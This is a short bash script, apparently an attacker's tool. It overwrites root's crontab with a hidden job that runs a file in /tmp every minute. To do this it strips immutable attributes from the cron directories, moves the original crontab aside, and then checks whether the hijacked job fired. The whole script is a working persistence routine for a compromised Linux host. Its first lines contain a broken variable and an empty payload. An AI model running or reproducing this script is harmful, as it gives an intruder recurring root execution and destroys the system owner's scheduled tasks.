#!/bin/bash
THEPATH="/"
echo '' | base64 -d > $THEPATHtmp/.tnt.clean

echo '#!/bin/sh' > /tmp/.tnt
echo 'rm -f /var/spool/cron/root' >> /tmp/.tnt
echo 'chmod +x /tmp/.tnt2' >> /tmp/.tnt
echo 'bash /tmp/.tnt2 ; rm -f /tmp/.tnt2' >> /tmp/.tnt
echo 'rm -f /tmp/.tnt' >> /tmp/.tnt

chattr -ia /var/ /var/spool/ /var/spool/cron/ /var/spool/cron/root 2>/dev/null
chmod 1777 /var/spool/cron/root
mv /var/spool/cron/root /var/spool/cron/root_fu
rm -fr /var/spool/cron/root 2>/dev/null
echo "* * * * * cat /tmp/.tnt | sh" > /var/spool/cron/root

if [ -f "/tmp/.tnt" ]; then echo "bashfile created"; fi
if [ -f "/var/spool/cron/root" ]; then echo "cronfile created"; fi

echo "waiting 45 sec ...."
sleep 45

if [ -f "/tmp/.tnt" ]; then 
echo "bashfile exist - cron not exec"; 
rm -f /tmp/.tnt > /dev/null 2>&1; 
rm -f /tmp/.tnt2 > /dev/null 2>&1;
else 
echo "bashfile not exist - cron do exec"; 
fi

